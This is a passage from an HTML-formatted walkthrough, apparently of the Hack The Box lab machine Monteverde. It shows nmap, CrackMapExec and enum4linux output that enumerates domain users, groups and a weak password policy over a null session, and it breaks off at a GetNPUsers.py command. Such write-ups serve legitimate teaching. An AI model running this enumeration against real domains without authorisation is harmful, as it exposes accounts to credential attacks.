style="color:#F8F8F2"><span class="token plain">|     version</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    bind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-25 20:20:31Z)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">135/tcp   open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">445/tcp   open  microsoft-ds?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">464/tcp   open  kpasswd5?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">636/tcp   open  tcpwrapped</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3269/tcp  open  tcpwrapped</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Not Found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">9389/tcp  open  mc-nmf        .NET Message Framing</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49667/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49674/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49675/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49703/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49775/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF-Port53-TCP:V=7.80%I=7%D=3/25%Time=5E7BC858%P=x86_64-unknown-linux-gnu%r</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:(DNSVersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07ver</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:sion\x04bind\0\0\x10\0\x03&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clock-skew: -48m05s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-security-mode:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2.02:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    Message signing enabled and required</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-time:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   date: 2020-03-25T20:22:50</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  start_date: N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 275.27 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s see what we can find through SMB with <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener noreferrer">CrackMapExec</a>, <a href="https://github.com/CiscoCXSecurity/enum4linux" target="_blank" rel="noopener noreferrer">enum4linux</a>
and <code>GetNPUsers.py</code> from impacket.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cme smb 10.10.10.172</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ enum4linux -a 10.10.10.172</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Mar 25 22:30:29 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ==========================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Target Information    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ==========================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Target ........... 10.10.10.172</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RID Range ........ 500-550,1000-1050</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Username ......... &#x27;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password ......... &#x27;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Enumerating Workgroup/Domain on 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[E] Can&#x27;t find workgroup/domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ============================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Nbtstat Information for 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ============================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Looking up status of 10.10.10.172</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">No reply from 10.10.10.172</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =====================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Session Check on 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =====================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Server 10.10.10.172 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Got domain/workgroup name:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ===========================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Getting domain SID for 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ===========================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Unable to initialize messaging context</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Domain Name: MEGABANK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Domain Sid: S-1-5-21-391775091-850290835-3566037492</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Host is part of a domain (not a workgroup)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ======================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    OS information on 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ======================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Got OS info for 10.10.10.172 from smbclient:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Got OS info for 10.10.10.172 from srvinfo:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Unable to initialize messaging context</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =============================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Users on 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =============================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O&#x27;Leary       Desc: (null)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[Guest] rid:[0x1f5]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[AAD_987d7f2f57d2] rid:[0x450]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[mhope] rid:[0x641]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SABatchJobs] rid:[0xa2a]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[svc-ata] rid:[0xa2b]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[svc-bexec] rid:[0xa2c]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[svc-netapp] rid:[0xa2d]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[dgalanos] rid:[0xa35]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[roleary] rid:[0xa36]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[smorgan] rid:[0xa37]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =========================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Share Enumeration on 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =========================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Unable to initialize messaging context</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Sharename       Type      Comment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ---------       ----      -------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Reconnecting with SMB1 for workgroup listing.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Unable to connect with SMB1 -- no workgroup available</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Attempting to map shares on 10.10.10.172</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Password Policy Information for 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[E] Unexpected error from polenum:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Attaching to 10.10.10.172 using a NULL share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Trying protocol 139/SMB...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        [!] Protocol failed: Cannot request session (Called Name:10.10.10.172)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Trying protocol 445/SMB...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        [!] Protocol failed: Missing required parameter &#x27;digestmod&#x27;.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Retieved partial password policy with rpcclient:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password Complexity: Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Minimum Password Length: 7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ==============================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Groups on 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ==============================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Getting builtin groups:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Incoming Forest Trust Builders] rid:[0x22d]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Windows Authorization Access Group] rid:[0x230]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Terminal Server License Servers] rid:[0x231]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Users] rid:[0x221]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Guests] rid:[0x222]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Remote Desktop Users] rid:[0x22b]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Network Configuration Operators] rid:[0x22c]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Performance Monitor Users] rid:[0x22e]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Performance Log Users] rid:[0x22f]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Distributed COM Users] rid:[0x232]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[IIS_IUSRS] rid:[0x238]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Cryptographic Operators] rid:[0x239]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Event Log Readers] rid:[0x23d]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Certificate Service DCOM Access] rid:[0x23e]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[RDS Remote Access Servers] rid:[0x23f]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[RDS Endpoint Servers] rid:[0x240]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[RDS Management Servers] rid:[0x241]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Hyper-V Administrators] rid:[0x242]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Access Control Assistance Operators] rid:[0x243]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Remote Management Users] rid:[0x244]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Storage Replica Administrators] rid:[0x246]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Getting builtin group memberships:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;IIS_IUSRS&#x27; (RID: 568) has member: Couldn&#x27;t lookup SIDs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Remote Management Users&#x27; (RID: 580) has member: Couldn&#x27;t lookup SIDs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Pre-Windows 2000 Compatible Access&#x27; (RID: 554) has member: Couldn&#x27;t lookup SIDs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Windows Authorization Access Group&#x27; (RID: 560) has member: Couldn&#x27;t lookup SIDs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Users&#x27; (RID: 545) has member: Couldn&#x27;t lookup SIDs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Guests&#x27; (RID: 546) has member: Couldn&#x27;t lookup SIDs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Getting local groups:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Cert Publishers] rid:[0x205]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[RAS and IAS Servers] rid:[0x229]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Allowed RODC Password Replication Group] rid:[0x23b]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Denied RODC Password Replication Group] rid:[0x23c]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[DnsAdmins] rid:[0x44d]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[ADSyncAdmins] rid:[0x451]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[ADSyncOperators] rid:[0x452]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[ADSyncBrowse] rid:[0x453]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[ADSyncPasswordSet] rid:[0x454]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Getting local group memberships:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Denied RODC Password Replication Group&#x27; (RID: 572) has member: Couldn&#x27;t lookup SIDs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;ADSyncAdmins&#x27; (RID: 1105) has member: Couldn&#x27;t lookup SIDs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Getting domain groups:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Domain Users] rid:[0x201]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Domain Guests] rid:[0x202]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Domain Computers] rid:[0x203]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Group Policy Creator Owners] rid:[0x208]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Cloneable Domain Controllers] rid:[0x20a]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Protected Users] rid:[0x20d]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[DnsUpdateProxy] rid:[0x44e]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Azure Admins] rid:[0xa29]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[File Server Admins] rid:[0xa2e]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Call Recording Admins] rid:[0xa2f]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Reception] rid:[0xa30]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Operations] rid:[0xa31]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Trading] rid:[0xa32]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[HelpDesk] rid:[0xa33]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Developers] rid:[0xa34]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Getting domain group memberships:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Operations&#x27; (RID: 2609) has member: MEGABANK\smorgan</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Group Policy Creator Owners&#x27; (RID: 520) has member: MEGABANK\Administrator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Guests&#x27; (RID: 514) has member: MEGABANK\Guest</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\Administrator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\krbtgt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\mhope</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\SABatchJobs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\svc-ata</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\svc-bexec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\svc-netapp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\dgalanos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\roleary</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Domain Users&#x27; (RID: 513) has member: MEGABANK\smorgan</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Trading&#x27; (RID: 2610) has member: MEGABANK\dgalanos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Azure Admins&#x27; (RID: 2601) has member: MEGABANK\Administrator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Azure Admins&#x27; (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;Azure Admins&#x27; (RID: 2601) has member: MEGABANK\mhope</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Group &#x27;HelpDesk&#x27; (RID: 2611) has member: MEGABANK\roleary</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =======================================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =======================================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[E] Couldn&#x27;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =============================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Getting printer info for 10.10.10.172    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> =============================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Unable to initialize messaging context</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">enum4linux complete on Wed Mar 25 22:31:39 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ GetNPUsers.py -no-pass 